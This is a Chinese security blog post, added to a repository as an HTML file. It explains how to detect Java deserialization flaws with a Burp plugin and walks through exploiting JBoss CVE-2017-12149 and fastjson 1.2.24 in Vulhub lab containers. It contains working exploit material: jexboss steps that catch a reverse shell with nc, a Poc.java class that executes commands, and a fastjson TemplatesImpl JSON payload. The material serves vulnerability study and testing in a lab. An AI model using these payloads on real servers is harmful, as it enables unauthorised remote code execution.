@@ -1,0 +1,552 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+  
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  
+  
+  <title>Java反序列化检测及漏洞复现 | W4rnIn9</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="漏洞复现,java,反序列化,">
+  
+
+
+  
+    <meta name="description" content="网络安全爱好者 CTFer">
+  
+
+  
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/icon/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+  <script src="/js/util.js"></script>
+<script src="/js/valine.min.js"></script>
+
+  
+
+  
+    <link href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css" rel="stylesheet">
+    <script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js" async></script>
+  
+
+  
+    <link href="https://cdn.bootcss.com/social-share.js/1.0.16/css/share.min.css" rel="stylesheet">
+  
+  
+  <script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js" async></script>
+  
+  
+    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.0/dist/av-min.js"></script>
+  
+
+</head>
+
+  <body>
+
+    
+
+    <div id="app">
+
+      <div class="header-wrap">
+  <header>
+    <div class="site-brand">
+      <div class="site-title">
+        <a href="/">JONER</a>
+      </div>
+    </div>
+    <nav class="site-navigation">
+      <ul class="nav-menu">
+      
+        <li class="nav-item" data-path="/">
+          
+            <a href="/" target="_self">
+              主页
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          
+            <a href="/archives/" target="_self">
+              归档
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path>
+          
+            <a href="javascript:void(0);" v-else>我</a>
+            <ul class="nav-menu--dropdown">
+              
+                <li>
+                  <a href="https://github.com/joner11234" target="_blank">
+                    Github
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+      
+      </ul>
+    </nav>
+    <i class="iconfont icon-menu"></i>
+  </header>
+</div>
+
+<script>
+  let links = document.querySelectorAll('.nav-item');
+  for(let link of links){
+    let childrenLink = link.querySelector('ul');
+    link.addEventListener('mouseenter', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown active";
+      }
+    })
+    link.addEventListener('mouseleave', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown";
+      }
+    })
+  }
+  let rootRealPath = getRealPath(window.location.pathname, true);
+  for(let link of links) {
+    let linkPath = link.getAttribute("data-path");
+    if(linkPath && getRealPath(linkPath, true) === rootRealPath) {
+      link.className = "nav-item hover";
+    }
+  }
+
+  let iconMenu = document.querySelector("i.iconfont.icon-menu"),
+    iconMenuClicked = false;
+  let navDOM = document.querySelector("nav.site-navigation");
+  iconMenu.addEventListener("click", () => {
+    iconMenuClicked 
+      ? navDOM.className = "site-navigation active"
+      : navDOM.className = "site-navigation";
+    iconMenuClicked = !iconMenuClicked;
+  })
+</script>
+
+      
+
+
+
+
+
+
+
+
+<div class="container post-index">
+
+  
+
+<div class="post">
+  <h1 class="article-title">
+    <span>Java反序列化检测及漏洞复现</span>
+  </h1>
+  <div class="article-top-meta">
+    <span>
+      发布 : 
+      2019-09-16
+    </span>
+    
+    
+  </div>
+
+  
+
+  <div class="article-content">
+    <div class="markdown-body">
+      <p>​    近几年涌现了许多经典的因为反序列化导致的远程代码执行漏洞，像fastjson，jackson，struts2，weblogic这些使用量非常大的产品都存在这类漏洞，但不幸的是，这些漏洞的修复方式都是基于黑名单，每次都是旧洞未补全，新洞已面世。通过上一篇《Java反序列化原理》可以看出该类型漏洞的影响还是很大的，下面将从漏洞检测以及漏洞利用来进一步介绍java反序列化在实战中的一些利用。</p>
+<h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><h3 id="burp反序列化插件-Java-Deserialization-Scanner"><a href="#burp反序列化插件-Java-Deserialization-Scanner" class="headerlink" title="burp反序列化插件 Java Deserialization Scanner"></a>burp反序列化插件 Java Deserialization Scanner</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>打开burp,选择Extdener-&gt;Bapp Store ，这是最简单的方法来获得插件，但下载的版本可能不是最新的。确保下载的是最新版本的方法就是从GitHub上下载并安装。</p>
+<p>插件中含有三种检测方法， sleep、DNS、以及CPU；</p>
+<p>通常情况下，DNS解析请求是最有可能绕过企业防火墙，因此是一个相当好的检测方法。在一般情况下，定时方法是更可靠和更可取的，但DNS方法可以适合用于 不稳定的系统或高度延迟的网络。</p>
+<p>CPU检测方法是基于Wouter Coekaerts”serialdos工作：没有任何脆弱的系统检测反序列化问题。有效载荷是基于一个系统对象（java util。HashSet），采用多CPU周期为反序列化任务。SerialDOS是创建一个POC的拒绝服务（DOS）攻击，但通过降低CPU周期需要反序列化它也可以用来作为一种检测方法。这个有效载荷是检测如果应用程序终结点实际上执行java反序列化，如果严格执行白名单的方法很有用。如果检查出阳性结果也有目标应用实施白名单的方式，允许HashSet类java.util包的可能性。在这种情况下，应用程序仍然容易受到DoS攻击。</p>
+<p>检测集成在Burp Suite的主动和被动的扫描器，在这里首先好下载ysoserial，并且将地址填入Exploiting configutation中</p>
+<p><img src="/article/a6638bb3/1568624169749.png" alt="1568624169749"></p>
+<p>配置好后，burp可以在扫描时自动识别java反序列化漏洞，如图所示</p>
+<p><img src="/article/a6638bb3/1568624511240.png" alt="1568624511240"></p>
+<p>或者也可以手动进行测试，首先将测试的请求发送到DS-Manual testing</p>
+<p><img src="/article/a6638bb3/1568624605111.png" alt="1568624605111"></p>
+<p>然后打开burp标签栏上的Deserialization Scanner，选择插入点、测试方式并开始测试</p>
+<p><img src="/article/a6638bb3/444-22-54.png" alt="444-22-54"></p>
+<p>测试结果将显示在右侧</p>
+<p><img src="/article/a6638bb3/258-24-17.png" alt="258-24-17"></p>
+<p>当然，这个插件也有漏洞利用的功能，这里先不介绍了</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="JBoss-5-x-6-x-反序列化漏洞（CVE-2017-12149）复现"><a href="#JBoss-5-x-6-x-反序列化漏洞（CVE-2017-12149）复现" class="headerlink" title="JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）复现"></a>JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）复现</h3><blockquote>
+<p>靶机:kali    ip:192.168.31.7</p>
+<p>攻击机:Windows    ip:192.168.31.116</p>
+</blockquote>
+<h4 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h4><p>该漏洞为 Java反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。</p>
+<h4 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h4><p>该漏洞出现在 <strong>/invoker/readonly</strong> 请求中，服务器将用户提交的POST内容进行了Java反序列化；</p>
+<p>访问<code>https://xxx.xxxxxx.xxx/invoker/readonly</code>如果页面返回500一般是存在了；</p>
+<p><img src="/article/a6638bb3/1567395869035.png" alt="1567395869035"></p>
+<h4 id="启动测试环境"><a href="#启动测试环境" class="headerlink" title="启动测试环境"></a>启动测试环境</h4><blockquote>
+<p><a href="https://vulhub.org" target="_blank" rel="noopener">Vulhub</a>是一个面向大众的开源漏洞靶场，无需docker知识，简单执行两条命令即可编译、运行一个完整的漏洞靶场镜像。旨在让漏洞复现变得更加简单，让安全研究者更加专注于漏洞原理本身。</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/vulhub/vulhub.git	#下载环境	</span><br><span class="line">cd vulhub/jboss/CVE-2017-12149	#进入相关漏洞的目录</span><br><span class="line">docker-compose up -d	#启动</span><br></pre></td></tr></table></figure>
+<p>访问靶机ip:8080 出现如下页面说明启动成功</p>
+<p><img src="/article/a6638bb3/1567395018129.png" alt="1567395018129"></p>
+<h4 id="攻击演示"><a href="#攻击演示" class="headerlink" title="攻击演示"></a>攻击演示</h4><h4 id="使用java反序列化终极测试工具"><a href="#使用java反序列化终极测试工具" class="headerlink" title="使用java反序列化终极测试工具"></a>使用java反序列化终极测试工具</h4><p>使用<strong>java反序列化终极测试工具</strong>,输入目标地址，首先获取信息，查看是否存在漏洞，如果存在漏洞可以直接执行命令，简单又好用</p>
+<p><img src="/article/a6638bb3/111.png" alt="1567398716662"></p>
+<h4 id="使用Jexboss"><a href="#使用Jexboss" class="headerlink" title="使用Jexboss"></a>使用Jexboss</h4><blockquote>
+<p>jexboss是一个使用Python编写的Jboss漏洞检测利用工具，通过它可以检测并利用web-console，jmx-console，JMXInvokerServlet这三个漏洞，并且可以获得一个shell。</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/joaomatosf/jexboss.git</span><br><span class="line">cd jexboss</span><br><span class="line">python jexboss.py -host http://192.168.31.7:8080</span><br></pre></td></tr></table></figure>
+<p><img src="/article/a6638bb3/1567416611533.png" alt="1567416611533"></p>
+<p>接着输入</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">No</span><br><span class="line">yes</span><br><span class="line">192.168.31.116 #攻击机ip</span><br><span class="line">9999 #攻击机监听端口</span><br><span class="line"><span class="meta">#</span><span class="bash">打开新的窗口 设置监听</span></span><br><span class="line">nc -l -p 9999 -vv</span><br></pre></td></tr></table></figure>
+<p>按下回车后再在nc监听窗口按一下回车获得反弹的shell，这种方式获得的shell一般权限都比较高。</p>
+<p><img src="/article/a6638bb3/qqq.png" alt="1567416447170"></p>
+<h3 id="fastjson-反序列化导致任意命令执行漏洞"><a href="#fastjson-反序列化导致任意命令执行漏洞" class="headerlink" title="fastjson 反序列化导致任意命令执行漏洞"></a>fastjson 反序列化导致任意命令执行漏洞</h3><blockquote>
+<p>2017年3月15日，fastjson官方发布安全公告表示fastjson在1.2.24及之前版本存在远程代码执行高危安全漏洞。攻击者可以通过此漏洞远程执行恶意代码来入侵服务器。fastjson官方建议直接升级到1.2.28/1.2.29或者更新版本来保证系统安全。</p>
+</blockquote>
+<p>​        fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并通过json来填充其属性值。而JDK自带的类<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>中有一个私有属性<code>_bytecodes</code>，其部分方法会执行这个值中包含的Java字节码。</p>
+<p>所以，想要使用<code>TemplatesImpl</code>的<code>_bytecodes</code>属性执行任意命令，有几个条件：</p>
+<ol>
+<li>目标网站使用fastjson库解析json</li>
+<li>解析时设置了<code>Feature.SupportNonPublicField</code>，否则不支持传入私有属性</li>
+<li>目标使用的jdk中存在<code>TemplatesImpl</code>类</li>
+</ol>
+<h4 id="启动测试环境-1"><a href="#启动测试环境-1" class="headerlink" title="启动测试环境"></a>启动测试环境</h4><blockquote>
+<p>靶机:kali    ip:192.168.31.7</p>
+<p>攻击机:Windows    ip:192.168.31.116</p>
+</blockquote>
+<p>还是使用的vulhub这个测试环境</p>
+<p>本环境目录结构如下：</p>
+<ul>
+<li>src 本项目源码<ul>
+<li>main/java java类<ul>
+<li>IndexFilter.java web源码</li>
+<li>Poc.java POC源码</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>pom.xml 配置文件，使用maven可以直接将本项目编译成war包</li>
+<li>exploit.php 读取编译好的POC字节码，并转换成base64</li>
+<li>fastjson-1.0.war 打包好的web环境，可以直接放到tomcat下运行</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub/fastjson/vuln			#进入目录</span><br><span class="line">docker-compose build			#编译</span><br><span class="line">docker-compose up -d			#运行</span><br></pre></td></tr></table></figure>
+<p>在攻击机上访问http:192.168.31.7:8080显示Hello World 说明启动成功了</p>
+<h4 id="生成Payload"><a href="#生成Payload" class="headerlink" title="生成Payload"></a>生成Payload</h4><p>首先需要自己修改Poc.java 这个类，将要执行的命令写进去，然后编译这个类获得class文件，获得字节码</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd src/main/java			#进入目录</span><br><span class="line">vim Poc.java				#编辑Poc.exe</span><br></pre></td></tr></table></figure>
+<p>这里设置执行的命令是在home下创建hacker文件，实际中可以执行任意命令</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Poc</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"touch /home/hacker"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] haFndlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Poc t = <span class="keyword">new</span> Poc();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后回到主目录编译代码,这里首先要安装maven，比较简单，这里不再赘述。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd ../../../</span><br><span class="line">mvn compile			#编译</span><br><span class="line"><span class="meta">#</span><span class="bash">这时候在target/classes文件下会生成Poc.class文件，下面对其进行base64编码</span></span><br><span class="line">base64 Poc.class</span><br></pre></td></tr></table></figure>
+<p>生成后放到如下位置中</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>,<span class="attr">"_bytecodes"</span>:[<span class="string">"放到这里"</span>],<span class="attr">"_name"</span>:<span class="string">"a.b"</span>,<span class="attr">"_tfactory"</span>:&#123; &#125;,<span class="attr">"_outputProperties"</span>:&#123; &#125;,<span class="attr">"_version"</span>:<span class="string">"1.0"</span>,<span class="attr">"allowedProtocols"</span>:<span class="string">"all"</span>&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>正常访问Hello World  抓包，构造一个POST数据提交，目标会提取json对象中的name和age拼接成一句话返回。</p>
+<p><img src="/article/a6638bb3/1567672160067.png" alt="1567672160067"></p>
+<p>接下在发送构造的poc发送</p>
+<p><img src="/article/a6638bb3/1568635189550.png" alt="1568635189550"></p>
+<p>可以看到执行成功了</p>
+<p><img src="/article/a6638bb3/1568635178053.png" alt="1568635178053"></p>
+<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="http://xxlegend.com/2018/06/20/先知议题 Java反序列化实战 解读/" target="_blank" rel="noopener">http://xxlegend.com/2018/06/20/先知议题 Java反序列化实战 解读</a></p>
+<p><a href="https://xz.aliyun.com/t/496" target="_blank" rel="noopener">https://xz.aliyun.com/t/496</a></p>
+<p><a href="https://mp.weixin.qq.com/s/nYY4zg2m2xsqT0GXa9pMGA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/nYY4zg2m2xsqT0GXa9pMGA</a></p>
+<p><a href="https://www.oracle.com/technetwork/security-advisory/cpuapr2018-3678067.html" target="_blank" rel="noopener">https://www.oracle.com/technetwork/security-advisory/cpuapr2018-3678067.html</a></p>
+<p><a href="https://vulhub.org/#/environments/weblogic/CVE-2018-2628/" target="_blank" rel="noopener">https://vulhub.org/#/environments/weblogic/CVE-2018-2628/</a></p>
+    </div>
+  </div>
+  
+    <div class="copy-right">
+      <div class="markdown-body">
+        <blockquote>
+        
+        
+          本文作者 : JONER <br>
+        
+        原文链接 : <a href>http://joner11234.github.io/article/a6638bb3.html</a><br>
+        版权声明 : 本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+        </blockquote>
+      </div>
+    </div>
+  
+  
+  
+    <div class="social-share" style="margin-top: -2rem" data-wechat-qrcode-title="<p>微信扫一扫</p>" data-wechat-qrcode-helper="<p>微信右上角, 扫一扫分享</p>" data-sites="qzone, qq, weibo, wechat, douban, google, facebook, twitter">
+  <span style="color: #6b7487; font-size: 1.4rem;">分享到: </span>
+</div>
+<script src="https://cdn.bootcss.com/social-share.js/1.0.16/js/social-share.min.js" async></script>
+  
+
+  
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+      <span>
+        
+          <i class="iconfont icon-06tags"></i>标签: 
+          
+          <span class="span--tag">
+            <a href="/tags/漏洞复现/">
+              #漏洞复现
+            </a>
+          </span>
+          
+          <span class="span--tag">
+            <a href="/tags/java/">
+              #java
+            </a>
+          </span>
+          
+          <span class="span--tag">
+            <a href="/tags/反序列化/">
+              #反序列化
+            </a>
+          </span>
+          
+        
+      </span>
+    </div>
+    <div class="article-meta pull-right">
+    </div>
+  </div>
+</div>
+
+
+  <aside id="sidebar">
+    <p id="sidebar-header"></p>
+    <ol id="sidebar-toc"></ol>
+  </aside>
+  <script async>setTimeout(generateToc, 10);</script>
+
+
+  <nav class="post-navigation">
+    
+      <div class="nav-pre">
+        <i class="iconfont icon-prev"></i>
+        上一篇:
+        <a href="/article/eac4b7e9.html" target="_self">NEST CTF答题夺旗赛(第一季)Writeup</a>
+      </div>
+    
+    
+      <div class="nav-next">
+        下一篇:
+        <a href="/article/e9839e6f.html" target="_self">一道姿势较多的隐写题</a>
+        <i class="iconfont icon-next"></i>
+      </div>
+    
+  </nav>
+
+  
+    <a href="#comment" class="comment-anchor"></a>
+<div class="comment-title"><i class="iconfont icon-footprint"></i> 留下足迹 <i class="iconfont icon-footprint"></i></div>
+<div id="vcomments"></div>
+
+<script defer>
+  if( true ) {
+    let path = getRealPath()
+    new Valine({
+      el: "#vcomments",
+      appId: "1NXTyN2WX8S3WVndpU432Q6j-gzGzoHsz",
+      appKey: "qKRwkiwKUs1Q6PynhoYXoF4t",
+      notify: false,
+      verify: false,
+      avatar: "robohash",
+      placeholder: "正确填写邮箱, 才能及时收到回复哦♪(^∇^*)",
+      path
+    });
+  }
+</script>
+   
+
+   
+
+</div>
+
+
+      <footer>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  <p class="site-info">
+    博客已运行<span id="time-to-now"></span><span class="my-face">👦</span>
+    <br>
+    
+  </p>
+  <span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</footer>
+
+
+
+<script>
+const timeToNowDOM = document.querySelector("#time-to-now");
+const startTimestamp = new Date(2019, 3, 2).getTime();
+
+const updateTimeStr = () => {
+  let offset = parseInt(
+      (new Date().getTime() - startTimestamp) / 1000,
+      10
+    ),
+    day = Math.floor(offset / 86400),
+    hour = Math.floor((offset % 86400) / 3600),
+    minute = Math.floor(((offset % 86400) % 3600) / 60),
+    second = Math.floor(((offset % 86400) % 3600) % 60);
+  timeToNowDOM.innerHTML =
+    day + "天" + hour + "小时" + minute + "分钟" + second + "秒";
+  setTimeout(updateTimeStr, 500);
+}
+
+setTimeout(updateTimeStr, 500);
+</script>
+
+
+      <div class="back-to-top hidden">
+  <span>
+    <i class="iconfont icon-60"></i><span></span>%
+  </span>
+</div>
+
+<script>
+const updateIconToTop = percent => {
+  let dom = document.querySelector(".back-to-top span span");
+  dom.innerText = percent;
+  if(percent < 1) {
+    document.querySelector(".back-to-top").className = "back-to-top hidden";
+  } else {
+    document.querySelector(".back-to-top").className = "back-to-top";
+  }
+}
+
+const handleScoll = () => {
+  let isRunning = false;
+  return () => {
+    if (isRunning) return;
+    isRunning = true;
+    window.requestAnimationFrame(timestamp => {
+      let scrollTop =
+          document.documentElement.scrollTop || document.body.scrollTop,
+        scrollHeight =
+          document.documentElement.scrollHeight ||
+          document.body.scrollHeight,
+        clientHeight =
+          document.documentElement.clientHeight ||
+          document.body.clientHeight;
+      isRunning = false;
+      if (scrollTop <= 1) {
+        updateIconToTop(0);
+        return;
+      }
+      if (scrollTop + clientHeight >= scrollHeight) {
+        updateIconToTop(100);
+      } else {
+        updateIconToTop(parseInt(
+          100 * scrollTop / (scrollHeight - clientHeight),
+          10
+        ));
+      }
+    });
+  };
+}
+
+const backToTop = () => {
+  let scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop,
+    delay = 10,
+    time = 200;
+  if (scrollTop <= 20) {
+    document.documentElement.scrollTop = 0;
+    document.body.scrollTop = 0;
+    return;
+  }
+  let step = Math.ceil(scrollTop * delay / time);
+  let timer = setInterval(() => {
+    scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop;
+    if (scrollTop - step <= 0) {
+      document.documentElement.scrollTop = 0;
+      document.body.scrollTop = 0;
+      clearInterval(timer);
+    } else {
+      document.documentElement.scrollTop = scrollTop - step;
+      document.body.scrollTop = scrollTop - step;
+    }
+  }, delay);
+}
+
+document.addEventListener("scroll", handleScoll(), false);
+
+document.querySelector(".back-to-top").addEventListener("click", backToTop, false);
+
+</script>
+
+    </div>
+
+    
+      <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+<script>
+  (() => {
+    const mathjaxConfig = {
+      showProcessingMessages: false, //关闭js加载过程信息
+      messageStyle: "none", //不显示信息
+      jax: ["input/TeX", "output/HTML-CSS"],
+      tex2jax: {
+        inlineMath: [["$", "$"], ["\\(", "\\)"]], //行内公式选择符
+        displayMath: [["$$", "$$"], ["\\[", "\\]"]], //段内公式选择符
+        skipTags: ["script", "noscript", "style", "textarea", "pre", "code", "a"] //避开某些标签
+      },
+      "HTML-CSS": {
+        availableFonts: ["STIX", "TeX"], //可选字体
+        showMathMenu: false //关闭右击菜单显示
+      }
+    }
+
+    let mathjaxInterval = setInterval(() => {
+      if(!window.MathJax){
+        return;
+      }
+      window.MathJax.Hub.Config(mathjaxConfig)
+      window.MathJax.Hub.Queue(["Typeset", MathJax.Hub, document.getElementById('app')])
+
+      clearInterval(mathjaxInterval)
+    }, 10)    
+  })()
+</script>
+    
+
+    <script src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js" async></script>
+<script async>
+  let fancyTimer = setInterval(function(){
+    if(!window.$){
+      return;
+    }
+    $(document).ready(function() {
+      $(".post img").each(function () {
+        if($(this).parent().get(0).tagName.toLowerCase() === "a") {
+          return;
+        }
+        // $(this).attr("data-fancybox", "gallery"); // if you add 'data-fancybox', img will display after showed
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "gallery");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      });
+      
+      clearInterval(fancyTimer);
+    });
+  }, 10);
+</script>
+
+    
+  </body>
+
+</html>
